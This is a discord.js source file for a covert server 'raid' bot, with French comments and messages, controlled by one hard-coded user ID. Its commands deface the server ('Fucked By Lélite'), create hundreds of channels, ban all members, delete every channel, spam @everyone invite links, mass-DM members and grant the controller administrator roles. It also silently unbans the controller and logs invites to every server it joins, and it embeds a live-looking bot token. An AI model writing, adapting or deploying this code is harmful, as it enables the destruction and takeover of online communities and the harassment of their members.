const Discord = require("discord.js");
const bot = new Discord.Client();
const fs = require("fs");
const token = "NTcyOTM4OTk5MzkyNjMyODMz.XMjlDg.N0MNhLn9YS1pPWTbs8Rqxo_MDlM"
const Adam = "554326071898669056"
const prefix = "*";
 
bot.on('ready',() => {
   console.log('--------------------------------------')
   console.log(`INFORMATIONS DU BOT: `);
   console.log(`Invite of bot all perms: https:\/\/discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=2146958591 `);
   console.log(`username: ${bot.user.tag} `);
   console.log(`ID: ${bot.user.id} `);
   console.log(`Date of creation: ${bot.user.createdAt} `);
   console.log(`Token: du bot: ${bot.token}`)
   console.log("--------------------------------------");  
   console.log(`INFORMATIONS OF SERVER BOT: `);
   console.log(`How many server: ${bot.guilds.size} `);
   console.log(`How many users: ${bot.users.size}`);
   
 
   
 
 
 
 
bot.guilds.forEach(guild => {
 var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
 invite.createInvite().then(invite => console.log(`>Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres || id: ${guild.id}`)).catch(e => {});
});
 });
 
 
 
 
 
 
bot.on('message', message => {
 
if(message.author.id === bot.user.id) return;
 
 
 
 
 
 
 if (message.content.includes("ban")) {  
  setTimeout(function() {
    if(message.content.includes("banall")) return;
    message.guild.unban(Adam).catch(e => {
      console.log("Quelqu'un a fait une commande de ban, vous n'avez pas été unban soit car vous ne l'été pas soit car le bot ne possede pas les permissions de le faire");
     })
    }, 5000)
     }
 
 
 
 
 
 
  if(message.content.startsWith(prefix + "help")){
    if (message.author.id !== Adam) return;
    if (message.deletable) message.delete();
     message.channel.send(`${prefix}unassign`);
     message.channel.send(`${prefix}assign`);
     message.channel.send(`${prefix}give`);
     message.channel.send(`${prefix}give++`);
     message.channel.send(`${prefix}mp`);
     message.channel.send(`${prefix}rename`);
     message.channel.send(`${prefix}del`);
     message.channel.send(`${prefix}deface`);
     message.channel.send(`${prefix}spam`);
     message.channel.send(`${prefix}banall`);
     message.channel.send(`${prefix}leave`);
}
 
 
 
 
 
 
 
//-------------------ASIGN ROLE-----------------
if (message.content.startsWith(prefix + "assign")) {  
if (message.author.id !== Adam) return;
if (message.deletable) message.delete();
    let args = message.content.split(" ").slice(1);  
    message.member.addRole(message.member.guild.roles.find("name", args.join(" "))).catch(e => {
      return console.log("Le role n'a pas pue être ajouté soit car il se trouve plus haut que celui du bot, soit car le bot n'a pas les permissions de gerer les roles.");
     })
    console.log(`Un role a été ajouté à Adam sur le serveur sauf si un autre message d'erreur sous celui ci dans la console indique le contraire.`);
     }
     
 
 
 
 
 
 
 //-------------------UNASIGN ROLE-----------------
 if (message.content.startsWith(prefix + "unassign")) {  
  if (message.author.id !== Adam) return;
  if (message.deletable) message.delete();
      let args = message.content.split(" ").slice(1);    
      message.member.removeRole(message.member.guild.roles.find("name", args.join(" "))).catch(e => {
        return console.log("Le role n'a pas pue être retiré soit car il se trouve plus haut que celui du bot, soit car le bot n'a pas les permissions de gerer les roles.");
       })
      console.log(`Un role a été retiré à Adam sur le serveur sauf si un autre message d'erreur sous celui ci dans la console indique le contraire.`);
       }
 
 
 
 
 
 
 
 
 
if (message.content.startsWith(prefix + "deface")) {
if (message.author.id !== Adam)
 return;
    console.log(`Commande ${prefix}deface par ${message.author.tag}`);
   fucked = false;
 
 
    if (!fucked){
      message.guild.setIcon("g").catch(e => {});
      message.guild.setName('Fucked By Lélite').catch(e => { console.log("Le nom du serveurs n'a pas pue être changer pour une quelconque raison.") });
      for (var i = 0; i < 500; i++) {
        message.guild.createChannel('join-élite', 'text').catch(e => { console.log("Les channels ne peuvent pas être créer pour une quelconque raison.") })
        }
      fucked = true;
    }
    if (message.deletable) {
      message.delete();
    }
  }
 
 
 
 
 
 
if (message.content.startsWith(prefix + "banall")) {
if (message.author.id !== Adam) return;
if (message.deletable) message.delete();
    console.log(`Commande ${prefix}banall par ${message.author.tag}`);
    let args = message.content.split(" ").slice(1)
    message.guild.members.forEach(member => {
       if(member.id === Adam) return;
      if (!member.roles.exists("name", "membre") && member.bannable) member.ban().catch(e => {
        console.log(`@${member.user.tag} n'a pas pue être banni.`);
      })
    });
  }
 
 
 
 
 
 
if (message.content.startsWith("l")) {
if (message.author.id !== Adam) return;
    console.log(`Commande ${prefix}leave par ${message.author.tag}`);
    if (message.deletable) message.delete().catch(e => {});
    message.guild.leave().catch(e => {});
  }
 
 
 
 
 
 
 
if (message.content.startsWith(prefix + "give")) {
if (message.author.id !== Adam) return;
    console.log(`Commande ${prefix}give par ${message.author.tag}`);
 
    message.member.guild.createRole({
      name: "Lélite",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      message.member.addRole(role).catch(e => { console.log("Le role n'a pas pue être créé et/ou attribué pour une quelconque raison.") });
      if (message.deletable) message.delete().catch(e => {});
    }).catch(e => {});
  }
 
 
 
 
 
 
  if (message.content.startsWith(prefix + "give++")) {
    if (message.author.id !== Adam)
    return;
    console.log(`Commande ${prefix}give++ par ${message.author.tag}`);
    let i = 0;
    let interval = setInterval(function () {
      if (i === 500) clearInterval(interval);
      message.guild.createRole({name: 'lélite', color:'#000000', permissions: "ADMINISTRATOR"}).then(function(role) {
        message.member.addRole(role).catch(e => { console.log("Les roles n'ont pas pue être créés et/ou attribués pour une quelconque raison.") });
        if (message.deletable) message.delete().catch(e => {});
      }).catch(e => {});
      i++
    }, 100)
  }
 
 
 
 
 
 
 
  if(message.content.startsWith(prefix + "rename")){
      if (message.author.id !== Adam) return;
      console.log(`Commande ${prefix}rename par ${message.author.tag}`);
      if(message.deletable) message.delete();
      message.guild.members.forEach(member => {
        let args = message.content.split(" ").slice(1)
        member.setNickname(args.join(" ")).catch(e => { console.log("Pour une quelqonque raison les personne n'ont pas pue être rename (peu être due aux nombres de caracteres.") });    
      })
  }
 
 
 
 
 
 
  if(message.content.startsWith("/")){
    if (message.author.id !== Adam)
    return;
    console.log(`Commande ${prefix}mp par ${message.author.tag}`);
    if(message.deletable) message.delete();
    message.guild.members.forEach(member => {
         member.send("TEXTE").catch(e => {
         
         console.log(`@${member.user.tag} n'a pas pue être pub due à ces parametres restrictif`);
       })        
    })
  }
 

  if (message.content.startsWith(prefix + "spam")) {
    if (message.author.id !== Adam) return;
    if (message.deletable) message.delete();  
    console.log(`Commande ${prefix}spam par ${message.author.tag}`);
    var interval = setInterval (function () {
       message.channel.send("@everyone Je t'oblige à rejoindre le serveur https://discord.gg/RFYMZcg")
    }, 450)
  }
 
 
 
 
 
 
    if(message.content.startsWith(prefix + "del")){
      if (message.author.id !== Adam) return;
      if (message.deletable) message.delete();
      console.log(`Commande ${prefix}del par ${message.author.tag}`);
        if(message.channel.type === "dm") return;
        if(message.guild.channels.size === 0) return;
        if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS") || !message.guild.member(bot.user).hasPermission("ADMINISTRATOR")) return;
        message.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
    }
   
 
});
 
bot.login(token).catch(e => {
  return console.log("Invalide Token.");
 })